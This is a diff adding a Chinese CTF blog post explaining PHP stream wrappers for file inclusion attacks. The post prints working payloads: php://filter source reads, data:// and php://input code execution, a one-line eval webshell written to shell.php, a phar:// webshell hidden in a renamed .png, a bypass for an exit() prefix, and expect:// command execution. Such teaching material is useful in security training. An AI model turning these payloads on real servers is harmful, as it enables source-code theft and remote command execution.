@@ -1,0 +1,806 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" href="/img/fav.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sl0th">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PHP伪协议前置条件–php.ini参数设置allow_url_fopen:默认值是ON。允许url里的封装协议访问文件； allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件； 文件包含函数1、include 2、require 3、include_once 4、require_once 5、highlight_file 6、show_source 7、rea">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php伪协议">
+<meta property="og:url" content="http://sloth31.github.io/2022/01/02/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
+<meta property="og:site_name" content="Sl0th&#39;s Blog">
+<meta property="og:description" content="PHP伪协议前置条件–php.ini参数设置allow_url_fopen:默认值是ON。允许url里的封装协议访问文件； allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件； 文件包含函数1、include 2、require 3、include_once 4、require_once 5、highlight_file 6、show_source 7、rea">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-02T15:06:47.000Z">
+<meta property="article:modified_time" content="2024-07-03T15:07:32.258Z">
+<meta property="article:author" content="Sl0th">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>php伪协议 | Sl0th&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sl0th&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php伪协议"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-01-02 23:06" pubdate>
+          2022年1月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">php伪协议</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h2 id="前置条件–php-ini参数设置"><a href="#前置条件–php-ini参数设置" class="headerlink" title="前置条件–php.ini参数设置"></a>前置条件–php.ini参数设置</h2><p>allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；</p>
+<p>allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；</p>
+<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>1、<code>include</code> 2、<code>require</code> 3、<code>include_once</code> 4、<code>require_once</code> 5、<code>highlight_file </code>6、<code>show_source</code> 7、<code>readfile</code></p>
+<p>8、<code>file_get_contents </code>9、<code>fopen</code> 10、<code>file</code>(比较常见)</p>
+<h2 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> file:<span class="hljs-comment">// — 访问本地文件系统</span><br><span class="hljs-number">2</span> http:<span class="hljs-comment">// — 访问 HTTP(s) 网址</span><br><span class="hljs-number">3</span> ftp:<span class="hljs-comment">// — 访问 FTP(s) URLs</span><br><span class="hljs-number">4</span> php:<span class="hljs-comment">// — 访问各个输入/输出流（I/O streams）</span><br><span class="hljs-number">5</span> zlib:<span class="hljs-comment">// — 压缩流</span><br><span class="hljs-number">6</span> data:<span class="hljs-comment">// — 数据（RFC 2397）</span><br><span class="hljs-number">7</span> glob:<span class="hljs-comment">// — 查找匹配的文件路径模式</span><br><span class="hljs-number">8</span> phar:<span class="hljs-comment">// — PHP 归档</span><br><span class="hljs-number">9</span> ssh2:<span class="hljs-comment">// — Secure Shell 2</span><br><span class="hljs-number">10</span> rar:<span class="hljs-comment">// — RAR</span><br><span class="hljs-number">11</span> ogg:<span class="hljs-comment">// — 音频流</span><br><span class="hljs-number">12</span> expect:<span class="hljs-comment">// — 处理交互式的流</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
+<h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a><strong>file:&#x2F;&#x2F;</strong></h2><p>该协议在双off情况下也能正常使用，用于访问本地文件系统(本地指定的是当前环境，ctf中的题目环境)</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/cmd.php?file=file:/</span><span class="hljs-regexp">/文件绝对路径/</span>网络路径<br></code></pre></td></tr></table></figure>
+
+<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p>php:&#x2F;&#x2F;作用为访问输入输出流</p>
+<p>使用条件：</p>
+<p><strong>1. 不需要开启allow_url_fopen</strong></p>
+<p><strong>2. php:&#x2F;&#x2F;input、 php:&#x2F;&#x2F;stdin、 php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include。</strong></p>
+<blockquote>
+<p>php:&#x2F;&#x2F;filter 用于读取源码且在双off的情况下也可以正常使用</p>
+</blockquote>
+<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>该协议可以获取指定文件源码，当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码(通常base64)，让其不执行。</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
+<td>这个参数是必须要出现在协议中的，决定了你要读取的数据流(文件)</td>
+</tr>
+<tr>
+<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
+</tr>
+<tr>
+<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>以下两种用法相同<br><code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code><br><code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code></p>
+</blockquote>
+<p>常见payload</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=index.php 以base64编码方式输出源码<br>php:<span class="hljs-regexp">//</span>filter/resource=index.php<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用的convert.base64-encode，就是一种过滤器</p>
+</blockquote>
+<h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p><strong>一、字符串过滤器</strong></p>
+<p>通常以<code>string</code>开头，对每个字符都进行同样方式的处理。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">string.rot13  <span class="hljs-comment"># 一种字符处理方式，字符右移十三位。</span><br>string.toupper  <span class="hljs-comment"># 将所有字符转换为大写。</span><br>string.tolower  <span class="hljs-comment"># 将所有字符转换为小写。</span><br>string.strip_tags  <span class="hljs-comment"># 这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>二、转换过滤器</strong></p>
+<p>对数据流进行编码，防止被解析执行，通常用来读取文件源码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">convert.base64-encode  <span class="hljs-comment"># base64加密</span><br>convert.base64-decode  <span class="hljs-comment"># base64解密</span><br>convert.quoted-printable-encode &amp; convert.quoted-printable-decode  <br><span class="hljs-comment"># 可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>三、压缩过滤器</strong></p>
+<p>这里的压缩不是生成zip文件，只是压缩和解压数据流中的有效载荷部分。</p>
+<p><code>zlib.deflate</code>（压缩）</p>
+<p><code>zlib.inflate</code>（解压）</p>
+<blockquote>
+<p><code>bzip2.compress</code>和 <code>bzip2.decompress</code>工作的方式与 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a> 过滤器大致相同</p>
+</blockquote>
+<p><strong>四、加密过滤器</strong></p>
+<p><code>mcrypt.*</code>和 <code>mdecrypt.*</code>使用 libmcrypt 提供了对称的加密和解密。</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<h3 id="利用filter伪协议绕过死亡exit"><a href="#利用filter伪协议绕过死亡exit" class="headerlink" title="利用filter伪协议绕过死亡exit"></a>利用filter伪协议绕过死亡exit</h3><p>死亡exit指的是在进行写入PHP文件操作时，执行了以下函数中的一种：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span> . <span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();?&gt;&#x27;</span> . <span class="hljs-variable">$content</span>);<br><span class="hljs-comment">//这会使php文件开头四exit函数，无法执行后续代码</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="base64decode绕过"><a href="#base64decode绕过" class="headerlink" title="base64decode绕过"></a>base64decode绕过</h4><p>利用php:&#x2F;&#x2F;filter的base64-decode方法，将<code>$content</code>(死亡exit)解码，利用php base64_decode函数特性去除死亡exit,当$content 包含 <?php exit; ?>时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</p>
+<blockquote>
+<p>base64编码中只包含64个可打印字符(a-z 0-9 A-Z)，当PHP遇到不可解码的字符时，会选择性的跳过</p>
+</blockquote>
+<h4 id="strip-tags绕过"><a href="#strip-tags绕过" class="headerlink" title="strip_tags绕过"></a>strip_tags绕过</h4><p><code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签,可以利用strip_tags函数去除,filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags|convert.base64-decode/</span>resource=shell.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p><strong>利用data:&#x2F;&#x2F; 时，PHP配置文件需要开启allow_url_fopen和allow_url_include</strong></p>
+<p>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://127.0.0.1/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>将post请求的数据当作php代码执行(记住要加上php头)</p>
+<p>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过</p>
+<blockquote>
+<p>当enctype&#x3D;”multipart&#x2F;form-data”的时候 <code>php://input</code> 是无效的</p>
+</blockquote>
+<h3 id="读取POST数据"><a href="#读取POST数据" class="headerlink" title="读取POST数据"></a>读取POST数据</h3><p>php:&#x2F;&#x2F;input可以读取POST上没有经过解析的原始数据<br>利用php:&#x2F;&#x2F;input 读取POST数据的时候，allow_url_fopen和allow_url_include不需要开启<br>示例代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>上面代码输出file_get_contents函数获取的php:&#x2F;&#x2F;input数据。<br>测试时传入POST数据字符串test<br>最后会在页面回显出test</p>
+<h3 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h3><p>利用php:&#x2F;&#x2F;input写入木马的时候，PHP配置文件只需要开启allow_url_include<br>如果POST传入的是PHP代码，就可以写入木马<br>示例代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>如果POST传入的是一个执行写入木马的PHP代码，就会在当前目录下写入一个木马，通过POST方法传入的是以下代码<br><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code><br>利用php:&#x2F;&#x2F;input传入木马的PHP代码<br><code>http&quot;//www.abc.com/xxx/file.php?file=php://input</code><br>测试的结果就是通过php:&#x2F;&#x2F;input传入了这个代码，并在当前目录下建立了shell.php文件</p>
+<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p><code>&lt;?php system(&#39;ls&#39;);?&gt;</code></p>
+<h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><p>可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">zip:<span class="hljs-regexp">//</span>中只能传入绝对路径。<br>要用<span class="hljs-comment">#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</span><br>只需要是zip的压缩包即可，后缀名可以任意更改。<br>相同的类型的还有zlib:<span class="hljs-regexp">//</span>和bzip2:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</li>
+</ol>
+<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">compress</span>.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2<br></code></pre></td></tr></table></figure>
+
+<p>2.compress.bzip2:&#x2F;&#x2F;file.bz2</p>
+<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">compress</span>.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2<br></code></pre></td></tr></table></figure>
+
+<p>3.compress.zlib:&#x2F;&#x2F;file.gz</p>
+<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">compress</span>.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz<br></code></pre></td></tr></table></figure>
+
+<h2 id="phar-x2F-x2F-伪协议"><a href="#phar-x2F-x2F-伪协议" class="headerlink" title="phar:&#x2F;&#x2F;伪协议"></a>phar:&#x2F;&#x2F;伪协议</h2><p>phar:&#x2F;&#x2F; 是用来解压的伪协议<br>phar:&#x2F;&#x2F;不管参数中是什么拓展名，都会被当做压缩包<br>用法：<code>?file=phar://压缩包/压缩文件</code><br>比如：<code>phar://xxx.png/shell.php</code><br><strong>利用phar:&#x2F;&#x2F; 时，PHP配置文件需要开启allow_url_fopen和allow_url_include，并且PHP版本要高于5.3.0</strong></p>
+<blockquote>
+<p>注意：压缩包需要用zip:&#x2F;&#x2F;伪协议压缩而不能用rar:&#x2F;&#x2F;，将木马文件压缩后，改成任意后缀名都可以正常使用</p>
+</blockquote>
+<p>写一个木马文件shell.php，然后用zip:&#x2F;&#x2F;伪协议压缩成shell.zip，最后修改后缀名为.png，上传图片<br>输入测试：<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p>
+<p>这样phar:&#x2F;&#x2F;就会将png当做zip压缩包进行解压，并且访问解压后的shell.php文件</p>
+<h2 id="expect-x2F-x2F-伪协议"><a href="#expect-x2F-x2F-伪协议" class="headerlink" title="expect:&#x2F;&#x2F;伪协议"></a>expect:&#x2F;&#x2F;伪协议</h2><p>expect:&#x2F;&#x2F;伪协议用来执行系统命令，但是需要安装拓展<br>用法: <code>?file=expect://ls</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+        <a href="/tags/php/">#php</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php伪协议</div>
+      <div>http://sloth31.github.io/2022/01/02/php伪协议/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sl0th</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年1月2日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                <i class="iconfont icon-sa"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">phar反序列化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/07/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" title="Linux定时任务">
+                        <span class="hidden-mobile">Linux定时任务</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
